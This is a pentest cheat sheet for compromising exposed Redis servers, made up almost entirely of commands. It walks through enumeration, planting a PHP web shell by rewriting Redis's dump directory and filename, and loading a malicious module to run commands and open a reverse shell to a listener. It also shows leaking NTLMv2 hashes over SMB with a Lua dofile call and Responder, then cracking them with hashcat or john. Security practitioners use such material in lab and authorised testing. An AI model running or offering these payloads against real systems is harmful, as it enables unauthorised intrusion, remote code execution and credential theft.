## NMAP
```bash
sudo nmap --script redis-info -sV -p 6379 $ip
```
## ENUMERATION
```bash
# tool
sudo apt install redis-cli -y

# Connect
sudo redis-cli -h $ip

# Get all config 
config get *

# Command is used to obtain the information and statistics about the Redis server
INFO

# select the desired database in Redis
SELECT 0
SELECT 1

# commmand is used to obtain all the keys in a database
KEYS *

# REDIS PASSWORD - check for parameter 
- requirepass

# REDIS CONFIG FILE PATH 
- /etc/redis/redis.conf

# CHECKING REDIS SERVICE CONFIGUARATION FILE
- /etc/systemd/system/redis.service
```
## UPLOAD WEBSHELL 
```bash
#[EXAMPLE - /opt/redis-files] (ANY FOLDER WHICH HAS WRITE ACCESS AND ACCESSIBLE VIA WEB) via redis-cli
192.168.245.166:6379> config set dir /opt/redis-files
OK
192.168.245.166:6379> config set dbfilename redis.php
OK
192.168.245.166:6379> set test "<?php system($_GET['cmd']);?>"
OK
192.168.245.166:6379> save
OK
```
## LOAD MODULE EXPLOIT 
```bash
## compile module.so
git clone https://github.com/binaryxploit/redis-module-load-cmd-exec.git
cd ./redis-module-load-cmd-exec
make

## Find a way to upload module.so - POC
- Example: 
- ftp access with writable pub directory.
- PATH `/var/ftp/pub/`
ftp> put module.so

## Load the module via redis-cli tool for command execution
# Required tools
sudo apt-get install redis-tools -y

# Load module.so form uploaded path
REDIS-CLI:6379> MODULE LOAD /var/ftp/pub/module.so

# List Loaded modules
REDIS-CLI:6379> MODULE LIST

# Command Execution
REDIS-CLI:6379> system.exec "id"

# Reverse Shell
nc -nvlp 80
REDIS-CLI:6379> system.rev 192.168.100.10 80
```
## REDIS 2.8.2402 - EXPLOIT (WINDOWS)
```bash
# Reference 
http://michalszalkowski.com/security/pentesting-ports/6379-redis/

# Can excute lua scripts using EVAL command
REDIS-CLI:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0

# Grab NTLMv2 hashes
sudo responder -I tun0

REDIS-CLI:6379> eval "dofile('//10.8.6.103/test')" 0 

# Crack the hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2-hash
```
## REDIS 4.X / 5.X - RCE
```bash
https://github.com/Ridter/redis-rce
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand 
https://github.com/binaryxploit
```
## REFERENCE
```md
http://michalszalkowski.com/security/pentesting-ports/6379-redis/
https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
```
